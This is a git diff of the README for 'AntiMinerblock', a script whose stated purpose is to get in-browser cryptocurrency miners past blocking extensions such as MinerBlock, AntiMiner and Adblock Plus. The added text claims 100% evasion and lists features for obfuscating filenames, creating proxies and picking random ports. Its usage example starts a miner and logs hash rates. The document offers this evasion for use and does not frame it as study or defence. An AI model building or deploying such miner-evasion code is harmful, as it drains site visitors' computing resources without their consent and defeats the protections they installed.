@@ -1,10 +1,18 @@
 # AntiMinerblock
 This script attempts to bypass extensions or network blocks that prevent the use of online cryptocurrency miners.
 
+## 100% effectiveness from tested extensions
+* MinerBlock
+* AntiMiner
+* Adblock (all lists enabled)
+* Adblock Plus
+
 ## Features
+* 100% success rate
 * Obfuscates filenames per server
-* Attempts to use Coinhive, Crypto-loot, and Cloudcoins, in that order.
-* Starts a proxy for coinhive on the server automatically
+* Automatically creates proxy
+* Random port
+* Interactive setup
 
 ## Installation
 ### Ubuntu/Unix
@@ -22,11 +30,13 @@ Not implemented yet (you can use cygwin for now)
 ## Usage
 Call loadCryptominer, which will return a miner, and will return a value 0 to 4 referring to whether or not it worked.
 ```
-0 - Coinhive
-1 - Crypto-loot
-2 - Cloudcoins
-3 - All blocked
-4 - Script not blocked, but failure creating miner instance
+0 - Remote coinhive
+1 - Local coinhive with proxy
+2 - Authedmine
+3 - Crypto-loot
+4 - Cloudcoins
+5 - All blocked
+6 - Script not blocked, but failure creating miner instance
 ```
 
 Example:
@@ -34,10 +44,19 @@ Example:
 loadCryptominer(function(miner, status) {
   //Code that mines
   //For example:
-  if (status == 3 || status == 4) {
-  	document.write("Please disable your adblock or minerblock")
+  if (status == 5 || status == 6) {
+    console.log("TEST FAILED!")
+  } else {
+    console.log("SUCCESSFULLY BYPASSED PROTECTION!")
   }
   miner.start();
+  // Update stats once per second
+  setInterval(function() {
+    var hashesPerSecond = miner.getHashesPerSecond();
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes();
+    console.log(hashesPerSecond, totalHashes, acceptedHashes)
+    }, 1000);
 });
 ```
 ## Donate!
